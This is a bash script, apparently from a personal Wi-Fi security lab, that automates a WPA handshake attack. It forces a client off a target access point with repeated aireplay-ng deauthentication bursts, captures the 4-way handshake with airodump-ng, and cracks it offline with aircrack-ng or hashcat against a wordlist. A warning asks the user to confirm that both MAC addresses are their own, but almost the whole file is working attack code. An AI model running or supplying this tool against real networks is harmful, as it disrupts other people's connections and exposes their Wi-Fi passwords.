#!/usr/bin/env bash
# All-in-one WPA handshake capture:
#   - locks the radio to the target channel
#   - starts airodump-ng in the background, writing to <prefix>-01.cap
#   - waits for the capture file to exist before firing deauth
#   - loops: deauth burst -> 5s of polling for the handshake -> repeat
#   - exits as soon as a handshake is detected, or after the timeout
#
# If -w <wordlist> is given, runs aircrack-ng against the capture once the
# handshake is in.
#
# Usage:
#   sudo ./08-handshake-capture.sh \
#       -a <bssid> -c <client> -i <iface> -k <channel> \
#       [-o <prefix>] [-w <wordlist>] [-t <timeout-seconds>]

set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/lib/common.sh"

require_root

usage() {
    die "Usage: $0 -a <bssid> -c <client> -i <iface> -k <channel> [-o <prefix>] [-w <wordlist>] [-t <timeout>]"
}

BSSID="" CLIENT="" IFACE="" CHANNEL="" OUTPUT="handshake" WORDLIST="" TIMEOUT=120
while getopts "a:c:i:k:o:w:t:" opt; do
    case "$opt" in
        a) BSSID=$OPTARG ;;
        c) CLIENT=$OPTARG ;;
        i) IFACE=$OPTARG ;;
        k) CHANNEL=$OPTARG ;;
        o) OUTPUT=$OPTARG ;;
        w) WORDLIST=$OPTARG ;;
        t) TIMEOUT=$OPTARG ;;
        *) usage ;;
    esac
done

[[ -z "$BSSID" || -z "$CLIENT" || -z "$IFACE" || -z "$CHANNEL" ]] && usage

warn "Handshake capture:"
warn "  AP BSSID  = $BSSID"
warn "  Client    = $CLIENT"
warn "  Channel   = $CHANNEL"
warn "  Iface     = $IFACE"
warn "  Output    = ${OUTPUT}-01.cap"
warn "  Timeout   = ${TIMEOUT}s"
warn "Confirm BOTH MACs are listed in lab-notes/inventory.md as YOURS."
sleep 2

# Wipe any prior capture with this prefix so we don't get confused by old packets.
rm -f "${OUTPUT}-"*

info "Locking $IFACE to channel $CHANNEL..."
iw dev "$IFACE" set channel "$CHANNEL"

info "Starting airodump-ng in background..."
airodump-ng -c "$CHANNEL" --bssid "$BSSID" -w "$OUTPUT" "$IFACE" \
    >"/tmp/airodump-${OUTPUT}.log" 2>&1 &
AIRODUMP_PID=$!
trap 'kill $AIRODUMP_PID 2>/dev/null || true; wait $AIRODUMP_PID 2>/dev/null || true' EXIT

CAPFILE="${OUTPUT}-01.cap"

# Wait for airodump to actually create the capture file before firing
# deauth — otherwise the client can disconnect+reconnect (handshake!)
# before the file even exists.
info "Waiting for $CAPFILE to appear..."
for i in $(seq 1 15); do
    [[ -f "$CAPFILE" ]] && break
    sleep 1
done
[[ -f "$CAPFILE" ]] || die "airodump-ng didn't create $CAPFILE — channel/BSSID wrong, or interface not in monitor mode."
info "Capture file ready."

has_handshake() {
    # aircrack-ng with -b filter is non-interactive (no network-selection
    # prompt) and prints "(1 handshake)" when the 4-way is complete.
    aircrack-ng -b "$BSSID" "$CAPFILE" </dev/null 2>&1 \
        | grep -q "1 handshake"
}

info "Hunting handshake (deauth burst every 5s, max ${TIMEOUT}s)..."
DEADLINE=$(( $(date +%s) + TIMEOUT ))
ROUND=0
while (( $(date +%s) < DEADLINE )); do
    ROUND=$((ROUND + 1))
    info "Round $ROUND -- deauth burst (5 frames)..."
    aireplay-ng --deauth 5 -a "$BSSID" -c "$CLIENT" "$IFACE" \
        >/dev/null 2>&1 || true

    # Check every second for 5 seconds before next burst.
    for s in 1 2 3 4 5; do
        sleep 1
        if has_handshake; then
            info "Handshake captured in $CAPFILE (after $ROUND deauth rounds)"
            kill "$AIRODUMP_PID" 2>/dev/null || true
            wait "$AIRODUMP_PID" 2>/dev/null || true
            trap - EXIT
            if [[ -n "$WORDLIST" ]]; then
                [[ -r "$WORDLIST" ]] || die "Wordlist not readable: $WORDLIST"
                info "Running offline crack with $WORDLIST..."
                exec aircrack-ng -w "$WORDLIST" -b "$BSSID" "$CAPFILE"
            fi
            info "Crack later with:"
            info "  sudo ./scripts/05-crack-handshake.sh -b $BSSID -w <wordlist> $CAPFILE"
            exit 0
        fi
    done
done

cat >&2 <<EOF

[x] No handshake after ${TIMEOUT}s. Common causes:
  - PMF (802.11w) enabled on the AP -- deauth is silently ignored
  - Wrong channel -- verify with: iw dev $IFACE info | grep channel
  - Wrong client MAC -- did the phone re-randomise its MAC?
  - Client/AP too far from the Pi -- weak signal loses handshake frames
  - aircrack-ng wants ALL 4 EAPOL frames; only 2 or 3 captured looks
    like "no handshake" to it. Try cracking with hashcat instead:
      hcxpcapngtool -o hash.hc22000 $CAPFILE
      hashcat -m 22000 hash.hc22000 <wordlist>

EOF
exit 1
